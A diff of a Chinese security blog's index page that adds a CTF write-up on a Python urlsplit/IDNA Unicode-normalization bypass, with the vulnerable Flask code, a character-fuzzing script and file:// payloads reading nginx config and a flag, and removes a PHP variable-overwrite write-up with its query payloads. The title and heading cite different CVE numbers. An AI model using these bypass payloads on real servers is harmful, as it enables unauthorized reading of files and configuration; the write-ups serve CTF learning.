@@ -169,6 +169,105 @@
 </nav>
       <div class="body-wrap">
   
+    <article id="post-urlsplit NFKD 标准化漏洞(CVE-2019-10160)(unicode编码处理不当)" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2021/09/06/urlsplit%20NFKD%20%E6%A0%87%E5%87%86%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2019-10160)(unicode%E7%BC%96%E7%A0%81%E5%A4%84%E7%90%86%E4%B8%8D%E5%BD%93)/" class="article-date">
+  	<time datetime="2021-09-05T16:00:00.000Z" itemprop="datePublished">2021-09-06</time>
+</a>
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="article-title" href="/2021/09/06/urlsplit%20NFKD%20%E6%A0%87%E5%87%86%E5%8C%96%E6%BC%8F%E6%B4%9E(CVE-2019-10160)(unicode%E7%BC%96%E7%A0%81%E5%A4%84%E7%90%86%E4%B8%8D%E5%BD%93)/">
+        urlsplit 不处理 NFKC 标准化(CVE-2019-9636)
+        
+      </a>
+    </h1>
+  
+
+      </header>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+        <h1 id="urlsplit-不处理-NFKC-标准化-CVE-2019-9636"><a href="#urlsplit-不处理-NFKC-标准化-CVE-2019-9636" class="headerlink" title="urlsplit 不处理 NFKC 标准化(CVE-2019-9636)"></a>urlsplit 不处理 NFKC 标准化(CVE-2019-9636)</h1><p>漏洞的原理：因为unicode编码处理不当产生的，即经过特殊制作的url可能会被错误解析以定位cookie或身份验证数据，并将该信息发送到与正确解析时不同的主机</p>
+<p>影响版本：python 2.7.x至2.7.16和3.x至3.7.2</p>
+<p>打开页面后，我们可以看见python写的源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])</span><br><span class="line">def getUrl():</span><br><span class="line">    url = request.args.get(&quot;url&quot;)</span><br><span class="line">    host = parse.urlparse(url).hostname #解析出主机名</span><br><span class="line">    if host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        return &quot;我扌 your problem? 111&quot;</span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[1] #再次解析主机名</span><br><span class="line">    if host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        return &quot;我扌 your problem? 222 &quot; + host</span><br><span class="line">    newhost = []</span><br><span class="line">    for h in host.split(&#x27;.&#x27;): #对www.example.com按.划分，先按idna编码，再utf-8解码</span><br><span class="line">        newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;))</span><br><span class="line">    parts[1] = &#x27;.&#x27;.join(newhost) #组合好解码后的主机名</span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line">    finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname #解析出主机名，要等于suctf.cc</span><br><span class="line">    if host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        return urllib.request.urlopen(finalUrl).read()</span><br><span class="line">    else:</span><br><span class="line">        return &quot;我扌 your problem? 333&quot;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>这是不完整的源码，我们可以在github上下载源码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><span class="line">from flask import Flask, Blueprint, request, Response, escape ,render_template</span><br><span class="line"></span><br><span class="line">from urllib.parse import urlsplit, urlunsplit, unquote</span><br><span class="line"></span><br><span class="line">from urllib import parse</span><br><span class="line"></span><br><span class="line">import urllib.request</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line"># Index</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/&#x27;, methods=[&#x27;GET&#x27;])</span><br><span class="line"></span><br><span class="line">def app_index():</span><br><span class="line"></span><br><span class="line">    return render_template(&#x27;index.html&#x27;)</span><br><span class="line"></span><br><span class="line">@app.route(&#x27;/getUrl&#x27;, methods=[&#x27;GET&#x27;, &#x27;POST&#x27;])//这以上就是声明一些路由和传参方式没什么太大的用处</span><br><span class="line"></span><br><span class="line">def getUrl():</span><br><span class="line"></span><br><span class="line">    url = request.args.get(&quot;url&quot;)//接收传进来的url</span><br><span class="line"></span><br><span class="line">    host = parse.urlparse(url).hostname//主要是用于解析url中的参数  对url按照一定格式进行 拆分或拼接 </span><br><span class="line"></span><br><span class="line">    if host == &#x27;suctf.cc&#x27;:</span><br><span class="line"></span><br><span class="line">        return &quot;我扌 your problem? 111&quot;</span><br><span class="line"></span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line"></span><br><span class="line">    host = parts[1]</span><br><span class="line"></span><br><span class="line">    if host == &#x27;suctf.cc&#x27;:</span><br><span class="line"></span><br><span class="line">        return &quot;我扌 your problem? 222 &quot; + host</span><br><span class="line"></span><br><span class="line">    newhost = []//以上两个if判断就是检测传进来的是不是suctf.cc&#x27;，如果是就报错</span><br><span class="line"></span><br><span class="line">    for h in host.split(&#x27;.&#x27;):</span><br><span class="line"></span><br><span class="line">        newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;))</span><br><span class="line"></span><br><span class="line">    parts[1] = &#x27;.&#x27;.join(newhost)</span><br><span class="line"></span><br><span class="line">    #去掉 url 中的空格</span><br><span class="line"></span><br><span class="line">    finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0]</span><br><span class="line"></span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line"></span><br><span class="line">    if host == &#x27;suctf.cc&#x27;://这里判断到如果为suctf.cc就可以执行读操作</span><br><span class="line"></span><br><span class="line">        return urllib.request.urlopen(finalUrl, timeout=2).read()</span><br><span class="line"></span><br><span class="line">    else:</span><br><span class="line"></span><br><span class="line">        return &quot;我扌 your problem? 333&quot;</span><br><span class="line"></span><br><span class="line">if __name__ == &quot;__main__&quot;:</span><br><span class="line"></span><br><span class="line">    app.run(host=&#x27;0.0.0.0&#x27;, port=80)</span><br></pre></td></tr></table></figure>
+<p>其中代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">request.args.get(&quot;url&quot;)</span><br></pre></td></tr></table></figure>
+<p>意思是获取get提交的url参数的值</p>
+<p>而这行代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">parse.urlparse(url).hostname</span><br></pre></td></tr></table></figure>
+<p>意思是获取url中的域名</p>
+<h2 id="parse-urlparse"><a href="#parse-urlparse" class="headerlink" title="parse.urlparse()"></a>parse.urlparse()</h2><p>用于获取网址中的网络协议、域名、文件存放路径、查询字符、可选参数以及拆分文档</p>
+<p>代码示例：</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">from urllib import parse</span><br><span class="line">url = &#x27;https://www.baidu.com/s;index.php?tn=78040160_14_pg&amp;ch=16#1&#x27;</span><br><span class="line"> </span><br><span class="line">result = parse.urlparse(url)</span><br><span class="line">print(&#x27;scheme:&#x27;,result.scheme)  #网络协议</span><br><span class="line">print(&#x27;netloc:&#x27;,result.netloc)  #域名</span><br><span class="line">print(&#x27;path:&#x27;,result.path)      #文件存放路径</span><br><span class="line">print(&#x27;query:&#x27;,result.query)    #查询字符</span><br><span class="line">print(&#x27;params:&#x27;,result.params)  #可选参数</span><br><span class="line">print(&#x27;fragment:&#x27;,result.fragment)  #拆分文档中的特殊猫</span><br></pre></td></tr></table></figure>
+<p>而代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">list(urlsplit(url))</span><br></pre></td></tr></table></figure>
+<p>意思是拆分url，并以数组的形式存储起来</p>
+<p>代码</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">for h in host.split(&#x27;.&#x27;):</span><br><span class="line"></span><br><span class="line">        newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;))</span><br><span class="line"></span><br><span class="line">    parts[1] = &#x27;.&#x27;.join(newhost)</span><br></pre></td></tr></table></figure>
+<p>将host中的”.”给去除掉，并将host拆分为一个一个字符进行idna编码和utf-8解码，而后又给数组中的元素用”.”连接起来，而这里就是漏洞的存在，我们可以构造有特殊字符的url，来绕过过滤，到达我们想访问的地方。</p>
+<p>而后会再经过一层过滤后，便可以使用urllib.request.urlopen()来读取文件</p>
+<p>同时我们打开页面源码，我们可以看见nginx的提示，而nginx文件时重要配置文件，里面有许多重要信息</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">配置文件存放目录：/etc/nginx</span><br><span class="line">主配置文件：/etc/nginx/conf/nginx.conf</span><br><span class="line">管理脚本：/usr/lib64/systemd/system/nginx.service</span><br><span class="line">模块：/usr/lisb64/nginx/modules</span><br><span class="line">应用程序：/usr/sbin/nginx</span><br><span class="line">程序默认存放位置：/usr/share/nginx/html</span><br><span class="line">日志默认存放位置：/var/log/nginx</span><br><span class="line">配置文件目录为：/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>
+<p>而我们想要读取就要绕过前两层的suctf.cc，第三层域名要等于suctf.cc，所以我们可以使用这个漏洞进行绕过，有两种方式</p>
+<h2 id="第一种"><a href="#第一种" class="headerlink" title="第一种"></a>第一种</h2><p>使用℆ 字符进行绕过，在进行idna编码和utf-8解码时，会将℆ 转换为c/u，所以我们可以构造paylaod</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/getUrl?url=file://suctf.c℆ sr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>
+<p>来看配置文件所在地，然后找到flag所在文件后，构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file://suctf.c℆sr/fffffflag</span><br></pre></td></tr></table></figure>
+<h2 id="第二种方法"><a href="#第二种方法" class="headerlink" title="第二种方法"></a>第二种方法</h2><p>构造exp</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">from urllib.parse import urlparse,urlunsplit,urlsplit</span><br><span class="line">from urllib import parse</span><br><span class="line">def get_unicode():</span><br><span class="line">    for x in range(65536):</span><br><span class="line">        uni=chr(x)</span><br><span class="line">        url=&quot;http://suctf.c&#123;&#125;&quot;.format(uni)</span><br><span class="line">        try:</span><br><span class="line">            if getUrl(url):</span><br><span class="line">                print(&quot;str: &quot;+uni+&#x27; unicode: \\u&#x27;+str(hex(x))[2:])</span><br><span class="line">        except:</span><br><span class="line">            pass</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def getUrl(url):</span><br><span class="line">    url = url</span><br><span class="line">    host = parse.urlparse(url).hostname</span><br><span class="line">    if host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        return False</span><br><span class="line">    parts = list(urlsplit(url))</span><br><span class="line">    host = parts[1]</span><br><span class="line">    if host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        return False</span><br><span class="line">    newhost = []</span><br><span class="line">    for h in host.split(&#x27;.&#x27;):</span><br><span class="line">        newhost.append(h.encode(&#x27;idna&#x27;).decode(&#x27;utf-8&#x27;))</span><br><span class="line">    parts[1] = &#x27;.&#x27;.join(newhost)</span><br><span class="line">    finalUrl = urlunsplit(parts).split(&#x27; &#x27;)[0]</span><br><span class="line">    host = parse.urlparse(finalUrl).hostname</span><br><span class="line">    if host == &#x27;suctf.cc&#x27;:</span><br><span class="line">        return True</span><br><span class="line">    else:</span><br><span class="line">        return False</span><br><span class="line"></span><br><span class="line">if __name__==&quot;__main__&quot;:</span><br><span class="line">    get_unicode()</span><br></pre></td></tr></table></figure>
+<p>来生成不同的c来绕过前两层的suctf.cc的判断，可以构造payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/getUrl?url=file://suctf.cＣ/usr/local/nginx/conf/nginx.conf</span><br></pre></td></tr></table></figure>
+<p>来读取配置文件信息，发现flag所在位置后，用payload</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?/getUrl?url=file://suctf.cＣ/usr/fffffflag</span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+      
+    </div>
+    
+    <div class="article-info article-info-index">
+      
+      
+	<div class="article-tag tagcloud">
+		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
+	</div>
+
+      
+
+      
+      <div class="clearfix"></div>
+    </div>
+      
+    
+  </div>
+  
+</article>
+
+
+
+
+
+
+
+  
     <article id="post-flask之jinja2模板注入读取config文件" class="article article-type-post" itemscope itemprop="blogPost">
   
     <div class="article-meta">
@@ -1202,97 +1301,9 @@ while count==1:
 
 
   
-    <article id="post-变量覆盖漏洞" class="article article-type-post" itemscope itemprop="blogPost">
-  
-    <div class="article-meta">
-      <a href="/2021/09/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/" class="article-date">
-  	<time datetime="2021-09-01T16:00:00.000Z" itemprop="datePublished">2021-09-02</time>
-</a>
-    </div>
-  
-  <div class="article-inner">
-    
-      <input type="hidden" class="isFancy" />
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/09/02/%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96%E6%BC%8F%E6%B4%9E/">
-        变量覆盖漏洞
-        
-      </a>
-    </h1>
-  
-
-      </header>
-      
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <h1 id="变量覆盖漏洞"><a href="#变量覆盖漏洞" class="headerlink" title="变量覆盖漏洞"></a>变量覆盖漏洞</h1><p>打开页面，然后用dirsearch扫描。发现.git文件泄露<br>flag.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"></span><br><span class="line">file_get_contents(&#x27;/flag&#x27;);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
-<p> index.php</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">include &#x27;flag.php&#x27;;</span><br><span class="line">$yds = &quot;dog&quot;;</span><br><span class="line">$is = &quot;cat&quot;;</span><br><span class="line">$handsome = &#x27;yds&#x27;;</span><br><span class="line"></span><br><span class="line">foreach($_POST as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    $$x = $$y;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">    if($_GET[&#x27;flag&#x27;] === $x &amp;&amp; $x !== &#x27;flag&#x27;)&#123;	//GET方式传flag只能传一个flag=flag</span><br><span class="line">        exit($handsome);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))&#123;	//GET和POST其中之一必须传flag</span><br><span class="line">    exit($yds);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)&#123;	//GET和POST传flag,必须不能是flag=flag</span><br><span class="line">    exit($is);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">echo &quot;the flag is: &quot;.$flag;</span><br></pre></td></tr></table></figure>
-
-<p>exit()</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">exit()函数会输出一条信息后退出</span><br></pre></td></tr></table></figure>
-<p>我们可以利用这个exit()函数来对调用flag.php文件里的file_get_contents(‘/flag’)，读出flag出来</p>
-<p>因此我们看</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x=&gt;$y)&#123;</span><br><span class="line">	$$x=$$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>中的$$x和$$y，我们可以看到有变量覆盖漏洞，因此我们get提交</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure>
-<p>让$x=yds，$y=flag，所以</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">”$$x==$$y“相当于”$yds=$flag“</span><br></pre></td></tr></table></figure>
-<p>所以我们要办法利用exit($yds)，因此我们要通过</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))</span><br></pre></td></tr></table></figure>
-<p>这一个条件，所以我们要让$_GET[‘flag’]和$_POST[‘flag’]不存在，所以之前构造的</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?yds=flag</span><br></pre></td></tr></table></figure>
-<p>便符合条件</p>
-<p>而如果想利用exit($is)的话，我们可以利用</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">foreach($_GET as $x =&gt; $y)&#123;</span><br><span class="line">	$$x=$$y;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>构造get提交</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?is=flag</span><br></pre></td></tr></table></figure>
-<p>便会构成</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">”$$x=$$y“相当于”$is=$flag“</span><br></pre></td></tr></table></figure>
-<p>然后我们经过以下条件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">if(!isset($_GET[&#x27;flag&#x27;]) &amp;&amp; !isset($_POST[&#x27;flag&#x27;]))</span><br><span class="line"></span><br><span class="line">if($_POST[&#x27;flag&#x27;] === &#x27;flag&#x27;  || $_GET[&#x27;flag&#x27;] === &#x27;flag&#x27;)</span><br></pre></td></tr></table></figure>
-<p>所以get要提交的参数flag或post要提交参数flag，所以可以构造paload</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">?is=flag&amp;flag=flag</span><br><span class="line"></span><br><span class="line">或</span><br><span class="line"></span><br><span class="line">get提交：?is=flag</span><br><span class="line">post提交：flag=flag</span><br></pre></td></tr></table></figure>
-
-
-      
-    </div>
-    
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/" rel="tag">代码审计</a></li></ul>
-	</div>
-
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-      
-    
-  </div>
-  
-</article>
-
-
-
-
-
-
-
-  
   
     <nav id="page-nav">
-      <a class="extend prev" rel="prev" href="/page/4/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/11/">11</a><a class="extend next" rel="next" href="/page/6/">Next &amp;raquo;</a>
+      <a class="extend prev" rel="prev" href="/page/4/">&amp;laquo; Prev</a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/3/">3</a><a class="page-number" href="/page/4/">4</a><span class="page-number current">5</span><a class="page-number" href="/page/6/">6</a><a class="page-number" href="/page/7/">7</a><span class="space">&hellip;</span><a class="page-number" href="/page/12/">12</a><a class="extend next" rel="next" href="/page/6/">Next &amp;raquo;</a>
     </nav>
   
 </div>
